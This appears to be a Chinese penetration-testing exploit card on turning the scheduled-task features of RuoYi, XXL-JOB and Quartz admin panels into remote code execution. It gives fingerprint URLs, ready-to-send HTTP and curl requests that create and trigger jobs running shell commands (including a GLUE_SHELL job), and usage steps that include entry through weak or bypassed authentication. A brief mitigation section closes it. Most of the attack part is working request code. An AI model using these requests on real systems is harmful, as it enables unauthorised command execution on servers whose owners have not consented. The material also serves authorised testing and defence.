---
title: 后台定时任务 / 计划任务注入（Quartz、XXL-JOB、若依）
cve: 无（功能滥用）
severity: critical
cvss: 9.1
product: 若依/XXL-JOB/Quartz 管理后台
versions: 任意
ports: 80, 443, 8080
keywords: 定时任务, quartz, xxl-job, 若依, rce, 计划任务
entry: 任务执行内容 / cron 表达式可写
verified: false
sources: 公开资料整理（功能滥用类）
---

## 指纹

```
GET  /monitor/job          → 若依定时任务页
GET  /xxl-job-admin        → XXL-JOB 控制台
POST /monitor/job/add      {"invokeTarget":"...","cronExpression":"0/5 * * * * ?"}
```

## 前置条件

- 能进后台（弱口令/越权/未授权均可）；
- 有"新建/编辑定时任务"的菜单。

## PoC

```http
### 若依：invokeTarget 里塞 bean 调用（常见被禁则换其他写法）
POST /monitor/job/add HTTP/1.1
Authorization: Bearer <token>

{"jobName":"x","jobGroup":"DEFAULT","invokeTarget":"ryTask.ryParams('id')","cronExpression":"0/5 * * * * ?","misfirePolicy":"1","concurrent":"1","status":"0"}
```

```bash
# 立即执行一次，看回显或带外
curl -s -X PUT https://target/monitor/job/run -H "Authorization: Bearer <t>" -d 'jobId=1&jobGroup=DEFAULT'
# 判定：命令输出出现在任务日志 / attacker 收到回连
```

```bash
# XXL-JOB：新建 GLUE(Shell) 任务
curl -s -X POST 'https://target/xxl-job-admin/jobinfo/add' -b /tmp/xxl.jar \
  -d 'jobGroup=1&jobDesc=x&executorHandler=&glueType=GLUE_SHELL&glueSource=id&cronGen_display=0/5 * * * * ?&executorRouteStrategy=FIRST'
```

## 利用步骤

1. 先确认菜单能进（越权也算入口）；
2. 用最低频率（60 秒）建任务，执行 `id` 或回连；
3. 命中即 RCE——立刻记台账，别留持久任务；
4. 证据：任务创建响应 + 执行日志。

## 修复与缓解

- 后台强口令 + 2FA；定时任务只允许白名单 bean（若依新版本已默认禁）；
- XXL-JOB 管理端只放内网，GLUE 模式默认关闭。

## 参考

- 若依官方安全说明；XXL-JOB 安全配置文档。
